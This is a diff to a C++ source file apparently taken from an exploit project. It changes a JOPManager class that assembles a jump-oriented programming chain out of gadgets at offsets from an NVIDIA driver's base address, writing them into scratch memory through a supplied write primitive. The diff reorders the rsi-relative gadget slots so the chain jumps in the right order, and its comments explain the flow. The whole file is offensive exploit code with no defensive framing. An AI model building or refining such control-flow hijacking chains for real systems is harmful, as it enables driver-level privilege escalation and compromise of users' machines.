@@ -1,7 +1,7 @@
 #include "jopmanager.h"
 
 JOPManager::JOPManager()
-    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0), scratchBase(0), rax(0), rsi(0), rdx(0)
+    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0), scratchBase(0), g1Off(0), rax(0), rsi(0), rdx(0)
 {}
 
 void JOPManager::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn) {
@@ -33,9 +33,10 @@ UINT64 JOPManager::Alloc(const char* name, UINT64 value) {
     return scratchBase + off;
 }
 
-void JOPManager::Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
+void JOPManager::Build(UINT64 g1Off_, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
     slots.clear();
     allocPtr = SCRATCH_ALLOC_START;
+    g1Off = g1Off_;
 
     if (!scratchBase) {
         DbgLog("[JOPManager::Build] FAIL: scratchBase not set\n");
@@ -46,9 +47,11 @@ void JOPManager::Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
     UINT64 g3 = nvidiaBase + g3Off;
     UINT64 g4 = nvidiaBase + g4Off;
 
-    // rsi slots — must be exactly 0xA5 apart
-    AddSlot("rsi_bck [rsi-0x39]", SCRATCH_RSI_BCK, g4);
-    AddSlot("rsi_fwd [rsi+0x66]", SCRATCH_RSI_FWD, g3);
+    // rsi slots:
+    // [rsi+0x66] = g2 (gadget1's jmp after target returns → gadget2 pop rdx)
+    // [rsi-0x39] = g3 (gadget2's jmp after pop rdx → gadget3)
+    AddSlot("rsi_fwd [rsi+0x66]", SCRATCH_RSI_FWD, g2);
+    AddSlot("rsi_bck [rsi-0x39]", SCRATCH_RSI_BCK, g3);
     rsi = scratchBase + SCRATCH_RSI_FWD - 0x66;
     DbgLog("[JOP] rsi=0x%llX  [rsi+0x66]=0x%llX  [rsi-0x39]=0x%llX\n",
         rsi, rsi + 0x66, rsi - 0x39);
